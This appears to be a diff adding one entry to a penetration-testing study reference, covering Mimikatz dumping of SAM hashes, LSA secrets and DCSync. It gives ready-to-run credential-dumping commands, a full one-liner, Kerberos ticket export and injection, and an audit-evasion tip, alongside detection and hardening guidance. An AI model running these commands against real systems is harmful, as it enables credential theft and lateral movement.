@@ -1,0 +1,140 @@
+{
+  "id": "mimikatz-lsadump",
+  "name": "Mimikatz LSA Dump (SAM / LSA Secrets)",
+  "command": "lsadump::sam",
+  "platform": "windows",
+  "category": "Credential Access",
+  "subcategory": "Credential Dumping",
+  "type": "command",
+  "description": "Dump local SAM database hashes and LSA secrets using mimikatz. Requires SYSTEM privileges. lsadump::sam extracts local account NTLM hashes; lsadump::lsa /patch extracts cached domain credentials and service account secrets.",
+  "notes": "Must run privilege::debug first (or already be SYSTEM). lsadump::sam dumps the local SAM database — gives local account hashes for pass-the-hash or cracking. lsadump::lsa /patch patches LSASS to read LSA secrets — gives cached domain creds, service account passwords in cleartext. token::elevate steals SYSTEM token from an existing SYSTEM process when you're only local admin. On DC: lsadump::dcsync is preferred over sam/lsa.",
+  "steps": [
+    {
+      "command": "privilege::debug",
+      "caption": "Step 1: Enable SeDebugPrivilege"
+    },
+    {
+      "command": "token::elevate",
+      "caption": "Step 2: Steal SYSTEM token (needed for SAM/LSA — elevates from local admin to SYSTEM)"
+    },
+    {
+      "command": "lsadump::sam",
+      "caption": "Step 3: Dump SAM database (local account NTLM hashes)"
+    },
+    {
+      "command": "lsadump::lsa /patch",
+      "caption": "Step 4: Dump LSA secrets (cached domain creds, service account passwords)"
+    }
+  ],
+  "variations": [
+    {
+      "command": "lsadump::lsa /patch",
+      "caption": "Dump LSA secrets — often reveals service account credentials in cleartext",
+      "label": "lsadump::lsa"
+    },
+    {
+      "command": "token::elevate",
+      "caption": "Impersonate SYSTEM token from local admin context",
+      "label": "token::elevate"
+    },
+    {
+      "command": "kerberos::purge",
+      "caption": "Purge all Kerberos tickets from current session (clean slate before PTT)",
+      "label": "kerberos::purge"
+    },
+    {
+      "command": "kerberos::list /export",
+      "caption": "List and export all Kerberos tickets to disk (.kirbi files)",
+      "label": "kerberos::list"
+    },
+    {
+      "command": "misc::cmd",
+      "caption": "Spawn a new cmd.exe with current mimikatz token context",
+      "label": "misc::cmd"
+    },
+    {
+      "command": "lsadump::dcsync /user:Administrator",
+      "caption": "DCSync — dump specific user hash from DC replication (requires domain admin or replication rights)",
+      "label": "lsadump::dcsync"
+    },
+    {
+      "command": "lsadump::dcsync /domain:<domain> /all /csv",
+      "caption": "DCSync — dump all domain hashes as CSV",
+      "label": "lsadump::dcsync"
+    },
+    {
+      "command": ".\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" \"lsadump::lsa /patch\" \"exit\"",
+      "caption": "One-liner: full dump sequence from cmd.exe",
+      "label": ".\\mimikatz.exe"
+    }
+  ],
+  "examples": [
+    {
+      "command": "privilege::debug\ntoken::elevate\nlsadump::sam",
+      "caption": "PEN-200 Ch15/23: dump local SAM hashes after gaining local admin on Windows host"
+    },
+    {
+      "command": "kerberos::purge\nkerberos::ptt <ticket.kirbi>",
+      "caption": "PEN-200 Ch15: purge existing tickets then inject a forged/stolen ticket for PTT"
+    }
+  ],
+  "tools": [
+    "mimikatz"
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1003.002",
+    "T1003.004",
+    "T1134.001"
+  ],
+  "exam": "exam-ok",
+  "certifications": [
+    "OSCP"
+  ],
+  "primary_cert": "OSCP",
+  "source": "PEN-200 2024.11 Ch15 / Ch23",
+  "references": [
+    {
+      "title": "Mimikatz lsadump module",
+      "url": "https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP Course)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-mimikatz-sekurlsa",
+      "rel": "next",
+      "note": "sekurlsa::logonpasswords for LSASS memory dump"
+    },
+    {
+      "id": "ptc-dcsync",
+      "rel": "next",
+      "note": "DCSync via impacket-secretsdump (no mimikatz required)"
+    },
+    {
+      "id": "pth-smbclient",
+      "rel": "next",
+      "note": "Use harvested NTLM hashes for pass-the-hash"
+    }
+  ],
+  "defense": {
+    "why_it_works": "lsadump::sam dumps local SAM database hashes (local user accounts). lsadump::secrets extracts LSA secrets from HKLM\\SECURITY\\Policy\\Secrets — which stores service account passwords, machine account passwords, cached domain credentials (DCC2), and stored credentials for autologon or scheduled tasks. lsadump::cache dumps Domain Cached Credentials (MS-CACHE v2 / DCC2 hashes) — offline crackable with hashcat -m 2100.",
+    "prerequisites": "SYSTEM privileges on target host. Mimikatz with privilege::debug. VSS or offline NTDS access for lsadump::lsa /patch on DC. For cached credentials: target must have previously logged on interactively (cached creds stored for offline logon).",
+    "impact": "T1003.002 OS Credential Dumping: SAM + T1003.004 LSA Secrets + T1134.001 Access Token Manipulation. Reveals local account hashes (PtH to other hosts where same local admin password set), service account plaintext passwords from LSA secrets, and cached domain credential hashes for offline cracking.",
+    "detection": "Event 4656/4663: access to HKLM\\SECURITY hive (requires object access auditing). Sysmon Event 13: registry reads from HKLM\\SECURITY\\Policy\\Secrets. EDR: LSA secret access pattern. Event 4688: Mimikatz process. Sysmon Event 10: LSASS access for lsadump::sam.\nProcesses accessing LSASS memory or SAM registry hives outside of trusted security tools, often followed by file creation or lateral movement (DET0234/AN0648).\nProcesses opening /proc/*/mem or /proc/*/maps targeting credential-storing services like sshd or login; high privilege escalation and memory inspection tools such as gcore or gdb (AN0649).\nUnsigned processes accessing system memory or launching known credential scraping tools (e.g., osascript, dylib injections) to access the Keychain or sensitive memory regions (AN0650).",
+    "artifacts": "Sysmon Event 13: registry read from HKLM\\SECURITY | Event 4656: access to SAM/SECURITY hive | EDR alert: LSA secret dump | Event 4688: Mimikatz on host | Cached credentials in HKLM\\SECURITY\\Cache",
+    "prevention": "LAPS (Local Administrator Password Solution) for unique local admin passwords — eliminates PtH lateral movement via shared local admin hash. Minimize service accounts with stored plaintext passwords (use gMSA). Limit interactive logons to servers (reduces cached domain credentials). CachedLogonsCount = 0 (no cached creds) for servers that don't need offline auth. EDR with LSA protection.\nActive Directory Configuration: Manage ACL for 'Replicating Directory Changes All'; add users to Protected Users security group to limit cached plaintext credentials.\nBehavior Prevention on Endpoint: Enable Windows 10 ASR rules to secure LSASS and prevent credential stealing.\nCredential Access Protection: Enable Credential Guard (Windows 10+) to protect LSA secrets; enable Protected Process Light for LSA on Server 2012 R2.\nEncrypt Sensitive Information: Ensure Domain Controller backups are properly secured.\nOperating System Configuration: Disable or restrict NTLM; disable WDigest authentication.\nPassword Policies: Ensure local administrator accounts have complex, unique passwords across all systems.\nPrivileged Account Management: Do not place domain accounts in local admin groups across systems; limit cross-tier admin use; on Linux restrict root access to prevent memory scraping.",
+    "evasion": "Read SAM/SECURITY hives offline from a VSS snapshot rather than directly accessing the live registry (avoids access audit events on live system). Remote registry read via SMB if admin shares accessible.",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1003/002/",
+      "https://attack.mitre.org/techniques/T1003/004/",
+      "https://attack.mitre.org/techniques/T1134/001/"
+    ],
+    "misconfiguration": "Same local admin password on all hosts (allows PtH from any compromised host to all others). Service accounts with plaintext passwords in LSA secrets. CachedLogonsCount > 0 on servers (DA creds cached from interactive sessions). LAPS not deployed.",
+    "vulnerable_config": "# Same local admin password everywhere:\n# lsadump::sam → Administrator: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c\n# PtH to every host with that hash → full lateral movement\n\n# Cached domain credentials (10 by default):\n(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon').CachedLogonsCount  # 10\n# DA logged on interactively → DCC2 hash crackable offline",
+    "secure_config": "# Deploy LAPS (unique local admin passwords):\n# Install LAPS from Microsoft → extend AD schema → deploy GPO\n# GPO: Computer Config → Admin Templates → LAPS → Password Settings\n# → Password complexity: Large letters+small letters+numbers+specials\n# → Password length: 25\n# → Password age: 30 days\n\n# Set CachedLogonsCount to 0 on servers (no cached domain creds):\nSet-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' -Name CachedLogonsCount -Value 0\n# Via GPO: Interactive logon: Number of previous logons to cache = 0\n\n# Use gMSA instead of service accounts with static passwords:\nNew-ADServiceAccount -Name svc_app -ManagedPasswordIntervalInDays 30 -DNSHostName app.corp.local"
+  }
+}
